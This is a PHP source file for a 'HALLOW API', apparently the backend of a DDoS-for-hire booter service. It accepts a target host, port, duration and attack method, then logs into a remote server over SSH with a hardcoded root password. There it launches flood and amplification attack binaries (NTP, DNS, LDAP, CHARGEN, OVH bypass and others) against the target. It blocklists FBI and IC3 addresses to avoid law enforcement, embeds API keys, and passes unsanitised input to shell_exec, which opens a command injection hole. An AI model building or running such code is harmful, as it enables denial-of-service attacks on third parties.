<title>HALLOW API - API System Made By Akami</title>
</body>
<?php

require 'list.php';
error_reporting(E_ALL); //PITS KEY   //HALLOWC2             //HYPER ENDS 2021/11/4
    $APIKeys = array("OMG-PIT", "HALLOW-a0976888865aaff292d679872b8edd0b", "HYPER-caf5d594277de5c3c531472633db2014"); //api keys
    $all = array("OVH-SLAM", "NFO-CRUSH", "GAME-UNI", "HTTP-REQUEST", "OVH-HALLOW", "NTP", "IPSEC", "FN-HALLOW", "OVH-TCP", "DNS", "DVR", "CHARGEN", "LDAP", "OVH-AMP", "ROBLOX-AMP");
    $blacklisted = array("1.1.1.1", "99.225.248.97", "2.2.2.2", "3.3.3.3", "https://www.fbi.gov/", "https://www.fbi.gov", "fbi.gov", "http://www.fbi.gov/", "http://www.fbi.gov", "www.fbi.gov", "https://www.ic3.gov/", "www.ic3.gov", "52.227.97.93", "104.16.149.244", "4.4.4.4", "5.5.5.5", "6.6.6.6", "7.7.7.7", "8.8.8.8", "104.16.148.244", "23.22.13.113", "172.67.71.68", "23.206.40.120", "216.58.198.206", "45.134.8.1753", "185.13.36.249", "54.38.41.65", "142.44.166.226", "117.27.239.0", "103.95.221.0", "101.71.138.0", "103.95.221.5", "103.95.221.83", "103.95.221.2", "103.95.221.84", "117.27.239.28", "117.27.239.155", "117.27.239.209", "117.27.239.200", "117.27.239.154", "73.37.37.1", "79.133.124.237", "45.134.8.160"); // MADE BY PIT

        $key = ($_GET["key"]);
        $test = ($_GET["method"]);
        $black = ($_GET["host"]);
    
          if ($time > 300){
      die('MAX time Reached');}
      
    if (!in_array($key, $APIKeys)) die('<p><body style="background-color:#252735;"><strong style="color:red";>ERROR:API Key Invalid</strong></code></body>');
    if (!in_array($test, $all)) die('<p><body style="background-color:#252735;"><strong style="color:red";>ERROR:Invalid Method</strong></code></body>');
    
if (!function_exists('ssh2_connect'))
{
        die('<p><body style="background-color:#252735;"><strong style="color:red";>ERROR:Could Not Connect</strong></code></body>'); // MADE BY PIT
}
if (isset($_GET['host'], $_GET['port'], $_GET['time'], $_GET['method'])) {


        $SERVERS = array(
                "91.236.254.49"       =>      array("root", "Imagine69420")
                );


                
        class ssh2 {
                var $connection;
                function __construct($ip, $user, $pass) {
                        if (!$this->connection = ssh2_connect($ip, 22))
                                throw new Exception('<p><body style="background-color:#252735;"><strong style="color:red";>ERROR:Connecting To Servers</strong></code></body>');
                        if (!ssh2_auth_password($this->connection, $user, $pass))
                                throw new Exception('<p><body style="background-color:#252735;"><strong style="color:red";>ERROR:Wrong Server Info</strong></code></body>');
                }

                function exec($cmd) {
                        if (!ssh2_exec($this->connection, $cmd))
                                throw new Exception("Error executing command: $cmd");

                        ssh2_exec($this->connection, 'exit');
                        unset($this->connection);
                }
        }
        $port = (int)$_GET['port'] > 0 && (int)$_GET['port'] < 65536 ? $_GET['port'] : 80;
        $port = preg_replace('/\D/', '', $port);
        $ip = preg_match('/^[a-zA-Z0-9\.-_]+$/', $_GET['host']) ? $_GET['host'] : die();
        $time = (int)$_GET['time'] > 0 && (int)$_GET['time'] < (60*60) ? (int)$_GET['time'] : 30;
        $time = preg_replace('/\D/', '', $time);
        $domain = $_GET['host'];
        $method = $_GET['method'];
                  if ($time > 900){
                  
                      if(endFunc($ip,".gov")) // .GOV
  die('<p><body style="background-color:#252735;"><strong style="color:red";>ERROR:Host Is Blacklisted</strong></code></body>');
if(endFunc($ip,".ca")) // .CA
  die('<p><body style="background-color:#252735;"><strong style="color:red";>ERROR:Host Is Blacklisted</strong></code></body>'); 
if(endFunc($ip,".edu")) // .EDU
  die('<p><body style="background-color:#252735;"><strong style="color:red";>ERROR:Host Is Blacklisted</strong></code></body>'); // MADE BY PIT

      die('<p><body style="background-color:#252735;"><strong style="color:red";>ERROR:MAX Time Reached</strong></code></body>');}

      if (in_array($ip, $blacklisted))
    {
     die('<p><body style="background-color:#252735;"><strong style="color:red";>ERROR:Host Is Blacklisted</strong></code></body>');
    }
        $smIP = str_replace(".", "", $ip);
        $smDomain = str_replace(".", "", $domain);
        $smDomain = str_replace("http://", "", $smDomain);
if ($_GET['method'] == "NFO-CRUSH") { $command = "screen -dm ./NFO-CRUSH TCP $ip $port $time "; }
if ($_GET['method'] == "HTTP-REQUEST") { $command = "screen -dm ./httpraw $ip 1000 get $time nil "; }
if ($_GET['method'] == "GAME-UNI") { $command = "screen -dm ./GAME-UNI $ip $port 10 -1 $time "; }
if ($_GET['method'] == "OVH-SLAM") { $command = "screen -dm ./OVH-SLAM $ip $port 10 -1 $time "; }
elseif ($_GET['method'] == "OVH-HALLOW") { $command = "screen -dm ./ovh-beta $ip $port 1200 30 -1 $time "; }
elseif ($_GET['method'] == "OVH-TCP") { $command = "screen -dm ./OVHTCP $ip $port 1500 30 -1 $time "; }
elseif ($_GET['method'] == "NTP") { $command = "screen -dm ./ntp $ip $port amp.txt 30 -1 $time "; }
elseif ($_GET['method'] == "DVR") { $command = "screen -dm ./DVR $ip $port amp.txt 30 -1 $time "; }
elseif ($_GET['method'] == "DNS") { $command = "screen -dm ./DNS $ip $port amp.txt 30 -1 $time "; }
elseif ($_GET['method'] == "MIX-AMP") { $command = "screen -dm ./MIX-AMP $ip $port amp-mix.txt 30 -1 $time "; }
elseif ($_GET['method'] == "OVH-AMP") { $command = "screen -dm ./ovh-downv2 $ip $port ovh.txt 30 -1 $time "; }
elseif ($_GET['method'] == "ROBLOX-AMP") { $command = "screen -dm ./VSE-FUCK $ip $port 30 $time "; }
elseif ($_GET['method'] == "IPSEC") { $command = "screen -dm ./IPSEC $ip $port amp.txt 30 -1 $time "; }
elseif ($_GET['method'] == "LDAP") { $command = "screen -dm ./LDAP $ip $port amp.txt 30 -1 $time "; }
elseif ($_GET['method'] == "CHARGEN") { $command = "screen -dm ./Chargen $ip $port amp.txt 30 -1 $time "; }
elseif ($_GET['method'] == "FN-HALLOW") { $command = "screen -dm ./FN-HALLOW $ip $port 30 -1 $time "; }
elseif ($_GET['method'] == "NFO-BEAM") { $command = "screen -dm ./NFO-BEAM $ip $port $time "; }
        else die();
        echo("<p>
      <body style=background-color:#000000;>
      <strong style=color:#317AB5;><center>ATTACK SENT WITH HALLOW API</center></strong></code></body></p>
      </p><body><code> <strong style=color:white><center> Host:</strong> <strong style=color:#317AB5;>$ip</center></strong></code></body>      <br>      <body><code> <strong style=color:white><center> Port:</strong> <strong style=color:#317AB5;>$port</center></strong></code></body>      <br>      <body><code> <strong style=color:white><center> Time:</strong> <strong style=color:#317AB5;>$time</center></strong></code></body>      <br>      <body><code> <strong style=color:white><center> Method:</strong> <strong style=color:#317AB5;>$method</center></strong></code></body>      <br>      <body><code> <strong style=color:white><center> Servers:</strong> <strong style=color:#317AB5;>2</center></strong></code></body>"); 
      
$user = $_GET['key'];
  shell_exec("python /var/www/html/api/webhook.py '$user' '$ip' '$port' '$time' '$method'"); // MADE BY PIT
      


        foreach ($SERVERS as $server=>$credentials) {
                $disposable = new ssh2($server, $credentials[0], $credentials[1]);
                $disposable->exec($command);


      
}
}
?>